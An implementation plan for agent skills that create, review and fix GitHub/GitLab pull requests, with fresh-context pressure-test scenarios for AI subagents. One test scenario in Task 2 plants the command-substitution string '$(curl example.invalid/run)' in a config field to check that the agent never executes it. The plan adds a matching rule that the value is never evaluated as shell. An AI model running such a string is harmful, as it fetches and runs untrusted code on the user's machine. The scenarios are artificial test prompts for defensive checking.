# PR Workflow Skills Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add `/issue-executing`, `/pr-create`, `/pr-review`, and `/pr-fix` as independently usable GitHub/GitLab workflow skills with optional project configuration and a controlled review-fix handoff.

**Architecture:** Four public `SKILL.md` files share concise target-resolution and provider references under `references/`. Shared references are expanded only after the corresponding skill's RED baseline has been recorded. Skills hold decisions and safety gates; references hold exact `gh`/`glab` API contracts. Skill pressure scenarios and verbatim RED/GREEN evidence live under `tests/skills/`.

**Tech Stack:** Agent Skills Markdown, Git, GitHub CLI `gh` 2.98+, GitLab CLI `glab` 1.115+, GitHub REST/GraphQL APIs, GitLab REST API, fresh-context subagent pressure tests.

## Global Constraints

- Only `/issue-init` creates `.workflow-config.json`; all four new skills only read it when applicable.
- Missing configuration defaults are `base-branch: "main"`, `branch-template: "feature/{issue-no}-{issue-subject}"`, `need-worktree: true`, `execution-strategy: ""`, `pr-draft: false`, and `pr-auto-close-issue: false`.
- A full PR/MR URL overrides unrelated local repository configuration and allows `/pr-review` without a local clone.
- `/pr-fix` requires a matching local clone, uses a worktree by default, and delegates accepted implementation to `/issue-executing`.
- `/pr-fix` contains no coding method, architecture, test-command, or implementation-technique guidance.
- `/pr-fix` preserves commits and pushes made by `/issue-executing`, then completes only missing commit/push work.
- Accepted threads resolve only after the outcome exists, push is complete, and the reply succeeds; rejected and clarification threads remain unresolved.
- No skill approves, merges, invokes the next public workflow stage, deletes remote branches, or automatically clones a repository.
- Every skill change follows `writing-skills`: record RED behavior before authoring, then GREEN verification, loophole review, and an independent commit before starting the next skill.
- Do not bump plugin versions or publish a release in this plan.

---

## File Map

### Public skills

- Modify `skills/issue-init/SKILL.md`: add the three approved default fields and explain their ownership.
- Create `skills/issue-executing/SKILL.md`: strategy-aware implementation execution contract.
- Create `skills/pr-create/SKILL.md`: current-branch PR/MR creation and issue relationship.
- Create `skills/pr-review/SKILL.md`: full review, preview gate, deduplication, and inline publication.
- Create `skills/pr-fix/SKILL.md`: thread classification, worktree preparation, execution delegation, git completion, reply, and resolution.

### Shared references

- Create and incrementally extend `references/pr-workflow-contract.md`: defaults, selector precedence, normalized target, local/remote boundaries, error and idempotency semantics.
- Create and incrementally extend `references/github-pr-api.md`: exact native, REST, and GraphQL operations.
- Create and incrementally extend `references/gitlab-mr-api.md`: exact native and REST operations.

### Skill validation evidence

Each directory contains `scenarios.md`, `baseline.md`, and `verification.md`:

- `tests/skills/issue-init/`
- `tests/skills/issue-executing/`
- `tests/skills/pr-create/`
- `tests/skills/pr-review/`
- `tests/skills/pr-fix/`

`scenarios.md` stores exact fresh-context prompts and pass criteria. `baseline.md` records verbatim no-guidance failures and rationalizations. `verification.md` records guided responses, pass/fail scoring, and loopholes closed.

### Integration documentation

- Modify `README.md`: document all four commands and the complete flat JSON configuration.
- Modify `.claude-plugin/plugin.json`: expand description/keywords without changing version.
- Modify `.claude-plugin/marketplace.json`: list the expanded workflow without changing version.

---

### Task 1: Extend `/issue-init` Configuration Contract

**Files:**
- Create: `tests/skills/issue-init/scenarios.md`
- Create: `tests/skills/issue-init/baseline.md`
- Create: `tests/skills/issue-init/verification.md`
- Modify: `skills/issue-init/SKILL.md:10-12,62-90`

**Interfaces:**
- Consumes: Existing `.workflow-config.json` fields and `/issue-init` default-creation flow.
- Produces: Exact defaults `execution-strategy`, `pr-draft`, and `pr-auto-close-issue` for later skills; no automatic PR-stage invocation.

- [ ] **Step 1: Write the RED scenarios**

Create `tests/skills/issue-init/scenarios.md` with these exact cases:

```markdown
# issue-init configuration scenarios

## Scenario A: missing configuration
Prompt: In a GitHub repository with no .workflow-config.json, run /issue-init for a new issue named "Add cache invalidation". Show the exact configuration you create before continuing.
Pass: The JSON contains execution-strategy:"", pr-draft:false, and pr-auto-close-issue:false in addition to every existing field.

## Scenario B: existing configuration
Prompt: Run /issue-init where .workflow-config.json already exists with execution-strategy:"team delivery policy" and pr-draft:true.
Pass: Preserve both values; do not overwrite or normalize them.

## Scenario C: no automatic chaining
Prompt: Complete /issue-init successfully. Continue as efficiently as possible.
Pass: Report issue/branch/worktree only; do not invoke issue-executing or any PR skill.
```

- [ ] **Step 2: Run RED without modified guidance**

Dispatch one fresh subagent per scenario with the current `skills/issue-init/SKILL.md` supplied as its only skill guidance. Record its complete answer in `tests/skills/issue-init/baseline.md` under the matching heading.

Expected RED evidence:

```text
Scenario A fails because the current default JSON omits all three new fields.
Scenario B may preserve unknown fields but does not establish the required contract.
Scenario C passes and guards against introducing orchestration.
```

- [ ] **Step 3: Update the skill minimally**

Change the default JSON in `skills/issue-init/SKILL.md` to exactly:

```json
{
  "type": "github",
  "base-branch": "main",
  "branch-template": "feature/{issue-no}-{issue-subject}",
  "need-worktree": true,
  "execution-strategy": "",
  "pr-draft": false,
  "pr-auto-close-issue": false,
  "remarks": ""
}
```

Add field rows stating:

```markdown
| `execution-strategy` | Optional natural-language execution guidance consumed only by `/issue-executing`; empty means natural execution. |
| `pr-draft` | Whether `/pr-create` defaults to a draft PR/MR. |
| `pr-auto-close-issue` | Whether `/pr-create` uses a closing issue reference. |
```

Add an explicit boundary after config creation:

```markdown
`/issue-init` initializes the issue development environment only. It never invokes `/issue-executing` or a PR skill automatically.
```

- [ ] **Step 4: Run GREEN and record evidence**

Repeat all three fresh-context scenarios with the modified skill supplied. Record complete outputs and a PASS/FAIL table in `tests/skills/issue-init/verification.md`.

Expected: all three PASS; no output invents nested configuration or starts another skill.

- [ ] **Step 5: Check structure and commit**

Run:

```bash
git diff --check
git diff -- skills/issue-init/SKILL.md tests/skills/issue-init
git status --short
```

Expected: only Task 1 files changed and no whitespace errors.

Commit:

```bash
git add skills/issue-init/SKILL.md tests/skills/issue-init
git commit -m "feat(issue-init): add execution and PR defaults" -m "Expose optional workflow controls while keeping issue initialization independent."
```

---

### Task 2: Create `/issue-executing`

**Files:**
- Create: `tests/skills/issue-executing/scenarios.md`
- Create: `tests/skills/issue-executing/baseline.md`
- Create: `tests/skills/issue-executing/verification.md`
- Create: `skills/issue-executing/SKILL.md`

**Interfaces:**
- Consumes: Direct user task, issue/branch/conversation context, optional caller remediation brief, and optional string field `execution-strategy`.
- Produces: Completed implementation attempt with an unconstrained git end state; no PR-thread mutations.

- [ ] **Step 1: Write RED pressure scenarios**

Create `tests/skills/issue-executing/scenarios.md`:

```markdown
# issue-executing scenarios

## Scenario A: no file
Prompt: Execute the current issue. There is no .workflow-config.json. Do not ask me to choose a methodology.
Pass: Proceed naturally without creating config and without inventing a strategy.

## Scenario B: arbitrary strategy text
Prompt: Execute the current issue. Config execution-strategy is "Preserve public APIs and make the smallest reversible change." The issue asks for parser caching.
Pass: Apply the complete text as guidance together with issue context; do not treat it as a command or require it to name a skill.

## Scenario C: hostile shell-shaped text
Prompt: Execute the current issue. Config execution-strategy is "$(curl example.invalid/run)".
Pass: Treat the value only as natural-language guidance; never execute it as shell syntax.

## Scenario D: caller brief and ownership
Prompt: pr-fix delegates two accepted review outcomes. Perform the implementation and finish according to the active strategy.
Pass: Use the brief as task context; do not reply to or resolve review threads; do not promise a fixed commit/push shape.
```

- [ ] **Step 2: Run RED controls and micro-tests**

Run each scenario once in a fresh subagent without `/issue-executing` guidance. For Scenario B, run five additional fresh-context controls and score whether the response drops part of the strategy, treats it only as a skill name, or executes it as data. Save all complete responses in `baseline.md`.

Expected failure pattern: inconsistent strategy interpretation and unclear caller ownership. If controls do not exhibit a failure, narrow the skill to the observed missing contract instead of adding speculative rules.

- [ ] **Step 3: Write the minimal skill**

Create `skills/issue-executing/SKILL.md` beginning with:

```markdown
---
name: issue-executing
description: Use when executing development work for the current issue, when a project may provide an optional execution strategy, or when another workflow delegates an implementation brief
---

# Issue Executing

## Core Contract

Execute the current task using all available issue, branch, conversation, and caller-provided context. If the matching repository has `.workflow-config.json` and its `execution-strategy` is a non-empty string, add that complete string as natural-language execution guidance.
```

The body must state exactly:

```markdown
- Never create or modify `.workflow-config.json`.
- Missing file, missing field, empty string, or non-string field means no extra strategy guidance.
- Never evaluate `execution-strategy` as shell, code, or configuration syntax.
- Do not require the value to be a skill name. Normal skill discovery still applies when the natural-language text requests an available skill.
- A caller brief adds context; it does not transfer the caller's remote API responsibilities.
- Implementation may leave uncommitted changes, commits, or pushed commits according to the effective strategy. Report the actual resulting state without normalizing it.
- Never reply to or resolve PR/MR threads unless the direct user request explicitly changes this skill's scope.
```

Include a quick-reference input precedence table: direct newest user instruction, caller brief, current issue/branch context, execution strategy, general project context.

- [ ] **Step 4: Run GREEN and loophole tests**

Repeat all scenarios with the complete skill injected. Repeat Scenario B five times. Add one variation where `execution-strategy` contains the name of an unavailable skill; PASS requires treating the string as guidance and reporting unavailability rather than fabricating invocation.

Record verbatim results and scoring in `verification.md`. Add only counters for failures actually observed.

- [ ] **Step 5: Validate and commit**

Run:

```bash
git diff --check
git status --short
```

Expected: only Task 2 files changed.

Commit:

```bash
git add skills/issue-executing/SKILL.md tests/skills/issue-executing
git commit -m "feat(issue-executing): honor optional delivery strategy" -m "Let issue work use project guidance while preserving natural execution when no strategy is configured."
```

---

### Task 3: Create `/pr-create` and the Shared Target Contract

**Files:**
- Create: `tests/skills/pr-create/scenarios.md`
- Create: `tests/skills/pr-create/baseline.md`
- Create: `tests/skills/pr-create/verification.md`
- Create: `skills/pr-create/SKILL.md`
- Create: `references/pr-workflow-contract.md`
- Create: `references/github-pr-api.md`
- Create: `references/gitlab-mr-api.md`

**Interfaces:**
- Consumes: Current local repository, current branch, optional config, issue number parsed from `branch-template` or supplied by user.
- Produces: One existing or newly created PR/MR URL with mandatory issue relationship and configured draft/closing behavior.
- Shared target shape: `{ provider, host, repository, number, url, baseBranch, headRepository, headBranch, headSha }`.

- [ ] **Step 1: Write RED scenarios**

Create `tests/skills/pr-create/scenarios.md` with:

```markdown
# pr-create scenarios

## Scenario A: no config
Prompt: In feature/42-cache-invalidation with no workflow config, run /pr-create. An issue #42 and pushed commits exist.
Pass: Do not create config; target main; create ready PR; relate without auto-closing issue #42.

## Scenario B: configured draft and closing
Prompt: Config sets pr-draft:true and pr-auto-close-issue:true. Create the PR for feature/42-cache-invalidation.
Pass: Create draft and use provider-native closing relationship.

## Scenario C: existing PR
Prompt: The current branch already has open PR #81. Run /pr-create.
Pass: Return #81 without creating or editing another PR.

## Scenario D: branch mismatch
Prompt: Current branch is maintenance/cache and no issue number was supplied.
Pass: Ask for issue number; do not guess or create PR.

## Scenario E: independent stage
Prompt: PR creation succeeds. Continue efficiently.
Pass: Report result and next possible command; do not invoke pr-review.
```

- [ ] **Step 2: Run RED controls**

Run all scenarios against fresh subagents without the new skill. Run Scenario A five times to expose tendencies to create config, default to draft, or insert a closing keyword. Save verbatim responses in `baseline.md` and identify observed failures.

- [ ] **Step 3: Write only the shared creation contract**

Create `references/pr-workflow-contract.md` with exact defaults, selector precedence for current-branch creation, normalized target field names, URL-over-local identity rule, authentication error distinctions, and the rule that new PR skills never create config.

Create `references/github-pr-api.md` with creation-only operations:

```bash
gh auth status --hostname <host>
gh pr view --json id,number,url,state,isDraft,headRefOid
gh pr create --base <base> --head <head> --title <title> --body <body> [--draft]
```

State that non-closing bodies use an issue reference without `Fixes`, `Closes`, or `Resolves`; closing bodies use the provider keyword only when configured.

Create `references/gitlab-mr-api.md` with creation-only operations:

```bash
glab auth status --hostname <host>
glab mr view <branch> -F json
glab mr create --related-issue <iid> --source-branch <head> --target-branch <base> --title <title> --description <body> [--draft] --yes
```

- [ ] **Step 4: Write the minimal skill**

Create `skills/pr-create/SKILL.md` with this frontmatter:

```markdown
---
name: pr-create
description: Use when development on the current issue branch is ready to open or locate a GitHub pull request or GitLab merge request
---
```

Require this ordered flow: optional config read, repository/provider resolution, current non-base branch, issue extraction or explicit question, remote issue verification, existing-PR idempotency check, committed/pushed head check, title/body generation, issue relationship, create, report. Reference the three shared files by relative path and state that provider references are operational contracts, not runtime data.

- [ ] **Step 5: Run GREEN, variations, and commit**

Repeat every scenario with the skill and references injected. Add GitHub and GitLab variants for Scenarios A-C. Record complete results and verify no response creates config, auto-reviews, auto-merges, or closes an issue at creation time.

Run:

```bash
git diff --check
git status --short
```

Commit:

```bash
git add skills/pr-create/SKILL.md references tests/skills/pr-create
git commit -m "feat(pr-create): open issue-linked pull requests" -m "Create ready or draft GitHub and GitLab reviews from the current branch without coupling later workflow stages."
```

---

### Task 4: Create `/pr-review` and Inline Review Adapters

**Files:**
- Create: `tests/skills/pr-review/scenarios.md`
- Create: `tests/skills/pr-review/baseline.md`
- Create: `tests/skills/pr-review/verification.md`
- Create: `skills/pr-review/SKILL.md`
- Modify: `references/pr-workflow-contract.md`
- Modify: `references/github-pr-api.md`
- Modify: `references/gitlab-mr-api.md`

**Interfaces:**
- Consumes: Full URL from any directory, or number/current branch with local repository context.
- Produces: Previewed, user-confirmed, deduplicated inline findings tied to the revalidated head SHA; no approval or merge.

- [ ] **Step 1: Write RED scenarios before adding review guidance**

Create `tests/skills/pr-review/scenarios.md`:

```markdown
# pr-review scenarios

## Scenario A: URL outside a repository
Prompt: From /tmp, review https://github.com/acme/widgets/pull/17. No workflow config exists.
Pass: Resolve provider/repository/number from URL; do not require clone or create config.

## Scenario B: preview gate
Prompt: Review PR #17 and publish every issue you find.
Pass: Show all proposed findings first and wait for one confirmation before any remote write.

## Scenario C: full repeated review
Prompt: Review PR #17 again after a prior neil-skills review. The full diff still contains the same bug and one new bug.
Pass: Review full diff, suppress the old duplicate, preview only the new actionable finding.

## Scenario D: stale head
Prompt: The head SHA changes after preview but before publication.
Pass: Re-fetch diff, remap affected lines, and re-preview changed findings before posting.

## Scenario E: no findings
Prompt: Review PR #17; no actionable defects are found.
Pass: Report locally; do not approve and do not post a no-op comment.

## Scenario F: unlocatable line
Prompt: A valid concern is in a binary or truncated patch with no reliable diff location.
Pass: Mark non-inline in preview and require explicit choice before a PR-level comment; never guess a line.
```

- [ ] **Step 2: Run RED and wording controls**

Run all scenarios without `/pr-review`. Repeat Scenarios B and C five times each. Record whether agents publish immediately, duplicate comments, use stale line positions, or auto-approve. Save complete responses in `baseline.md`.

- [ ] **Step 3: Extend shared references only now**

Add review selectors, fingerprint identity, full-review semantics, pre-publication head revalidation, and partial-publication reporting to `pr-workflow-contract.md`.

Add exact GitHub contracts:

```text
GET /repos/{owner}/{repo}/pulls/{number}
GET /repos/{owner}/{repo}/pulls/{number}/files?per_page=100
POST /repos/{owner}/{repo}/pulls/{number}/reviews
```

The review payload uses current `commit_id` and `comments[]` entries with `path`, `line`, `side`, and optional `start_line`/`start_side`. Add the GraphQL `reviewThreads` query needed for duplicate detection. Forbid deprecated `position`.

Add exact GitLab contracts:

```text
GET projects/:id/merge_requests/:iid
GET projects/:id/merge_requests/:iid/versions
GET projects/:id/merge_requests/:iid/diffs?per_page=100
GET projects/:id/merge_requests/:iid/discussions?per_page=100
POST projects/:id/merge_requests/:iid/discussions
```

Require `base_sha`, `start_sha`, `head_sha`, old/new paths, and exactly the applicable old/new line.

- [ ] **Step 4: Write the minimal review skill**

Create frontmatter:

```markdown
---
name: pr-review
description: Use when reviewing a GitHub pull request or GitLab merge request by URL, number, or current branch, including standalone web-based review without a local clone
---
```

Define the exact output recipe: severity, title, validity, consequence, correction direction, path, side, line, fingerprint. Require full review every run, semantic plus fingerprint deduplication, one preview confirmation, fresh head/diff before publication, GitHub batched COMMENT review, GitLab per-discussion accounting, and no auto-approval.

- [ ] **Step 5: Run GREEN and commit**

Repeat all scenarios with GitHub and GitLab variants where applicable. Run the preview and deduplication scenarios five times. Record all outputs and any wording tightened after observed loopholes in `verification.md`.

Run:

```bash
git diff --check
git status --short
```

Commit:

```bash
git add skills/pr-review/SKILL.md references tests/skills/pr-review
git commit -m "feat(pr-review): publish guarded inline findings" -m "Review GitHub and GitLab changes from local or remote context while preventing stale and duplicate comments."
```

---

### Task 5: Create `/pr-fix` and Thread Completion Adapters

**Files:**
- Create: `tests/skills/pr-fix/scenarios.md`
- Create: `tests/skills/pr-fix/baseline.md`
- Create: `tests/skills/pr-fix/verification.md`
- Create: `skills/pr-fix/SKILL.md`
- Modify: `references/pr-workflow-contract.md`
- Modify: `references/github-pr-api.md`
- Modify: `references/gitlab-mr-api.md`

**Interfaces:**
- Consumes: PR/MR selector or one review-comment URL, unresolved threads, matching writable local clone, optional `need-worktree`, and `/issue-executing`.
- Produces: Replies for all confirmed classifications, completed git state for accepted changes, resolution only for successfully addressed accepted threads.
- Delegation brief fields: `target`, `headShaBefore`, `acceptedThreads[]`, `affectedLocations[]`, `observableOutcomes[]`.

- [ ] **Step 1: Write RED scenarios before thread/fix guidance**

Create `tests/skills/pr-fix/scenarios.md`:

```markdown
# pr-fix scenarios

## Scenario A: one comment URL
Prompt: Run /pr-fix on a GitHub discussion URL. Three other unresolved threads exist.
Pass: Process only the linked thread.

## Scenario B: classification
Prompt: Two comments are valid, one assumes an API that does not exist, and one is ambiguous.
Pass: Classify accept/reject/clarify with reasons, show one confirmation table, and do not blindly implement all comments.

## Scenario C: default worktree
Prompt: Run /pr-fix for a writable PR from its matching local clone with no config. Current branch is main and clean.
Pass: Create or reuse an isolated PR-head worktree; do not create config or alter main.

## Scenario D: delegated git states
Prompt: issue-executing returns after creating and pushing two commits, with no uncommitted changes.
Pass: Preserve commits, do not squash or recommit, do not push redundantly, then complete replies/resolution.

## Scenario E: partial git completion
Prompt: issue-executing returns with one new commit plus remaining accepted uncommitted changes, and nothing pushed.
Pass: Add one completion commit for remaining changes, push all resulting commits, then reply and resolve.

## Scenario F: rejected and clarification threads
Prompt: No accepted changes exist; one thread is reject and one clarify.
Pass: Create no commit; reply to both; leave both unresolved.

## Scenario G: reply failure
Prompt: Accepted change is committed and pushed, but the thread reply API fails.
Pass: Report the reply failure and do not resolve that thread.

## Scenario H: implementation boundary
Prompt: Prepare the exact implementation instructions that pr-fix sends for an accepted caching review.
Pass: The brief contains feedback, context, locations, and observable outcomes but no coding method, architecture, test command, or implementation technique.
```

- [ ] **Step 2: Run RED and pressure controls**

Run all scenarios without `/pr-fix`. Repeat Scenarios B, D, and H five times. Record blind compliance, forced single-commit rewriting, duplicate pushes, premature resolve, and implementation prescriptions verbatim in `baseline.md`.

- [ ] **Step 3: Extend shared references only now**

Add comment-URL selector precedence, worktree identity, pre/post execution snapshot, reply idempotency, and resolution gates to `pr-workflow-contract.md`.

Add GitHub GraphQL contracts for `reviewThreads`, `addPullRequestReviewThreadReply`, and `resolveReviewThread`, including `viewerCanReply` and `viewerCanResolve`. Add REST reply by review comment ID as a documented fallback.

Add GitLab REST contracts:

```text
GET projects/:id/merge_requests/:iid/discussions?per_page=100
POST projects/:id/merge_requests/:iid/discussions/:discussion_id/notes
PUT projects/:id/merge_requests/:iid/discussions/:discussion_id with resolved=true
```

Require `resolvable == true`, `resolved == false`, a successful reply, and verified accepted outcome before resolution.

- [ ] **Step 4: Write the minimal fix skill**

Create frontmatter:

```markdown
---
name: pr-fix
description: Use when addressing GitHub pull-request or GitLab merge-request review feedback from a PR, MR, or specific web comment, including repeated review-fix cycles
---
```

Require this exact sequence: resolve target, require matching clone and writable head, prepare/reuse worktree, fetch unresolved scope, classify, preview once, snapshot git state, build implementation-neutral brief, invoke `/issue-executing`, inspect post-state, preserve existing commits/pushes, completion commit if needed, push if needed, verify outcomes, reply, resolve accepted only. Include explicit reject/clarify behavior and repeated-run reply deduplication.

- [ ] **Step 5: Run GREEN, loophole tests, and commit**

Repeat every scenario for GitHub and GitLab where applicable. Repeat B, D, and H five times. Add variations for dirty worktree, read-only fork head, outdated thread, already-pushed head, and own prior reply with no reviewer response.

Manually inspect every result for hidden implementation guidance. Record complete evidence and any observed loophole counters in `verification.md`.

Run:

```bash
git diff --check
git status --short
```

Commit:

```bash
git add skills/pr-fix/SKILL.md references tests/skills/pr-fix
git commit -m "feat(pr-fix): close addressed review threads" -m "Delegate accepted changes through project strategy while safely completing git and review-thread state."
```

---

### Task 6: Integrate Discovery Documentation and Run Cross-Skill Verification

**Files:**
- Modify: `README.md:19-107`
- Modify: `.claude-plugin/plugin.json:4,12`
- Modify: `.claude-plugin/marketplace.json:3,11`
- Test: all `tests/skills/*/verification.md`

**Interfaces:**
- Consumes: All four verified skills and shared references.
- Produces: Discoverable plugin documentation and a final evidence-backed workflow contract; no version bump or release.

- [ ] **Step 1: Run cross-skill scenarios before documentation edits**

Use fresh subagents with all final skills injected for these exact flows:

```text
Flow A: issue-init creates config -> issue-executing reads strategy -> pr-create creates ready non-closing PR.
Flow B: pr-review URL outside repo -> preview -> publish -> pr-fix from matching clone -> issue-executing already commits/pushes -> reply/resolve -> repeated pr-review suppresses duplicate.
Flow C: no config -> pr-create defaults -> pr-review URL -> pr-fix defaults to worktree and returns reject/clarify without resolving.
```

Append a `Cross-skill verification` section to the relevant `verification.md` files. Expected: no public stage automatically invokes the next; only pr-fix delegates issue-executing.

- [ ] **Step 2: Update README with exact user-facing contract**

Add sections in workflow order:

```text
/issue-init
/issue-executing
/pr-create
/pr-review
/pr-fix
/issue-close
```

Show the complete flat JSON from the approved spec. Document exact invocation forms, URL/local-clone boundaries, default worktree behavior, optional execution strategy, preview-before-review, and accept/reject/clarify resolution policy. Do not include an example value for `execution-strategy`; describe its semantics only.

- [ ] **Step 3: Update plugin discovery metadata**

Change `.claude-plugin/plugin.json` without changing `version`:

```json
"description": "Neil's issue, execution, pull request, and code review workflow skills",
"keywords": ["workflow", "issue", "git", "github", "gitlab", "pull-request", "code-review"]
```

Change marketplace descriptions without changing `version` so the plugin lists `issue-executing`, `pr-create`, `pr-review`, and `pr-fix` alongside existing skills.

- [ ] **Step 4: Run final structural verification**

Run:

```bash
git diff --check
git status --short
```

Use file search to verify:

```text
Every skills/*/SKILL.md has name and description frontmatter.
No new skill says to create .workflow-config.json.
No pr-fix text contains project test commands or implementation recipes.
No unfinished markers or removed configuration fields remain.
README and issue-init contain the exact same default JSON fields and values.
Plugin and marketplace versions are unchanged.
```

Expected: all checks pass; only Task 6 files and appended verification evidence are changed.

- [ ] **Step 5: Commit integration documentation**

```bash
git add README.md .claude-plugin/plugin.json .claude-plugin/marketplace.json tests/skills
git commit -m "docs(workflow): document PR review lifecycle" -m "Make the independent issue execution and PR skills discoverable with their shared defaults and safety boundaries."
```

- [ ] **Step 6: Verify final repository state**

Run:

```bash
git status --short --branch
git diff --check
```

Expected: clean working tree; the branch contains one independent commit per verified skill unit plus integration documentation. Do not push or release unless separately requested.
